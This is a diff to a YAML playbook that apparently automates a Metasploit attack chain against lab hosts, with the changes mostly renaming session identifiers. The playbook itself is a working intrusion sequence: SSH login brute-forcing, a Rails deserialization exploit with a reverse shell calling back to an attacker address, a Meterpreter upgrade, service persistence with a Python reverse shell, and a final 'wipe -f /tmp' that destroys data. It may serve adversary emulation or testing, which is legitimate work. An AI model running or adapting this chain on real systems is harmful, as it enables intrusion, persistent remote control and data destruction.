@@ -2,7 +2,7 @@ commands:
 
   - type: msf-module
     cmd: "auxiliary/scanner/ssh/ssh_login"
-    creates_session: ssh_login
+    creates_session: sshLogin
     options:
       RHOSTS: "192.168.56.181"
       RPORT: "22"
@@ -16,6 +16,7 @@ commands:
   - type: msf-module
     cmd: "exploit/multi/http/rails_secret_deserialization"
     payload: "ruby/shell_reverse_tcp"
+    creates_session: railsShell
     payload_options:
       LHOST: "192.168.56.191"
       LPORT: "4444"
@@ -27,7 +28,7 @@ commands:
       
   - type: msf-module
     cmd: "post/multi/manage/shell_to_meterpreter"
-    session: ssh_login
+    session: sshLogin
     creates_session: meterpreter
       
   - type: sleep
@@ -37,20 +38,20 @@ commands:
   - type: msf-module
     cmd: "exploit/linux/local/service_persistence"
     payload: "cmd/unix/reverse_python"
-    session: ssh_login
-    creates_session: service_persistence
+    session: sshLogin
+    creates_session: servicePersistence
     payload_options:
       LHOST: "192.168.56.191"
     options:
       VERBOSE: "true"
 
   - type: msf-session
-    session: "ssh_login"
-    cmd: "exit"
+    session: sshLogin
+    cmd: exit
 
   - type: msf-session
-    session: "meterpreter"
-    cmd: "exit"
+    session: meterpreter
+    cmd: exit
  
   - type: sleep
     seconds: 15
@@ -59,8 +60,8 @@ commands:
   - type: msf-module
     cmd: "exploit/multi/handler"
     payload: "cmd/unix/reverse_python"
-    session: service_persistence
-    creates_session: handler_session
+    session: servicePersistence
+    creates_session: handlerSession
     payload_options:
       LHOST: "192.168.56.191"
     options:
@@ -72,8 +73,8 @@ commands:
     
   - type: msf-session
     cmd: "apt install wipe -y"
-    session: handler_session
+    session: handlerSession
     
   - type: msf-session
     cmd: "wipe -f /tmp"
-    session: handler_session
+    session: handlerSession
